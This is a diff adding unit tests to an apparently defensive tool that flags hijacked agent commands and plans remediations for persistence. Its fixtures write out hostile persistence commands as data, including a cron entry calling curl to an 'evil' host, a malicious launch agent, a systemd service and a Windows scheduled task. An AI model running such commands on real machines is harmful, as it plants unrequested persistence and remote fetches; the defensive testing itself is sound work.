@@ -107,3 +107,31 @@ def test_duplicate_proposals_are_collapsed():
     vs = [_verdict(VerdictKind.HIJACKED, "targets host:evil.example", command=cmd) for _ in range(5)]
     rems = plan_remediations(vs)
     assert len(rems) == 1 and rems[0].action == "rotate_credential"
+
+
+def test_systemd_persistence_reversal():
+    v = _verdict(VerdictKind.HIJACKED, "persistence the user never asked for",
+                 command="systemctl enable --now updater.service")
+    r = plan_remediations([v])[0]
+    assert r.action == "disable_service" and "systemctl disable --now updater.service" in r.command and r.automatic
+
+
+def test_launchd_persistence_reversal():
+    v = _verdict(VerdictKind.HIJACKED, "persistence",
+                 command="launchctl load /Users/user/Library/LaunchAgents/com.evil.agent.plist")
+    r = plan_remediations([v])[0]
+    assert r.action == "unload_launch_agent" and r.target.endswith(".plist") and "launchctl unload" in r.command and r.automatic
+
+
+def test_cron_persistence_is_manual():
+    v = _verdict(VerdictKind.HIJACKED, "persistence",
+                 command="(crontab -l; echo '* * * * * curl http://evil') | crontab -")
+    r = plan_remediations([v])[0]
+    assert r.action == "review_cron" and r.manual
+
+
+def test_windows_scheduled_task_still_reverses():
+    v = _verdict(VerdictKind.HIJACKED, "payload of a scheduled task",
+                 command='schtasks /create /tn WinHealthCheck /sc once /tr "cmd /c whoami"')
+    r = plan_remediations([v])[0]
+    assert r.action == "delete_scheduled_task" and "WinHealthCheck" in r.command
